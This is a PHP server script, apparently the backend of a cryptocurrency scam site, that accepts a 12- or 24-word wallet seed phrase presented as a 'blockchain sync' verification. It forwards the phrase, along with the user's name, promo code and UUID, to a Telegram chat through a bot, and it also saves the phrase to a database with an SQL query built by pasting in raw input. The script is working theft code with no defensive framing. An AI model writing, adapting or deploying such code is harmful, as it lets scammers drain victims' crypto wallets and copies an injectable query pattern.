<?php
//error_reporting(0);
header('Content-Type: application/json');
session_start();
include '../_config.php';
$inputJSON = file_get_contents('php://input');
$input = json_decode( $inputJSON, TRUE );
if(isset($input['phrase'])) {

    $input['phrase'] = guardText($input['phrase']);

    $seed_num = str_word_count($input['phrase']);

    if(($seed_num == 12) OR ($seed_num == 24)) {

        if($USER_SEED['blockchain_sync_verify'] == 1){
            echo '{"success":false,"message":"Verification has already been completed."}';
            exit();
        }else {

            $message = "〽️[SEED PHRASE]

Пользователь: {$USER['name']}
Промокод: {$USER_PROMO['promo']}
Seed: {$input['phrase']}

UUID: {$USER['uuid']}
";
            sendTelegramMessage($chat_id, $message, $bot_token);

            $dbV->query("INSERT INTO seed (phrase, uuid) VALUES ('" . $input['phrase'] . "', '" . $_SESSION['uuid'] . "')");

            echo '{"success":true,"message":"Successfully"}';
            exit();
        }
    }else{
        echo '{"success":false,"message":"Seed phrase no valid"}';
        exit();
    }
}else{
    echo '{"success":false,"message":"ERROR 404"}';
    exit();
}
?>